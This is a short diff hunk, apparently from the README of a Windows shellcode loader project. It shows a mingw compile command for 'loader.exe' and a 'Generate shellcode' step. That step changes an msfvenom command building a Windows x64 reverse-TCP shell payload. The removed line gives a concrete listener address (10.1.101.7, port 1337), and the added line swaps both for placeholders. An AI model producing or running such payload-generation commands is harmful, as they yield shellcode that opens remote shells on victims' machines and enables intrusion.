@@ -23,5 +23,5 @@ x86_64-w64-mingw32-gcc loader.c -o loader.exe -I/usr/local/openssl-windows/inclu
 
 ## Generate shellcode
 ```
-msfvenom -p windows/x64/shell_reverse_tcp LPORT=1337 LHOST=10.1.101.7 -f hex
+msfvenom -p windows/x64/shell_reverse_tcp LPORT=<IP> LHOST=<IP> -f hex
 ```
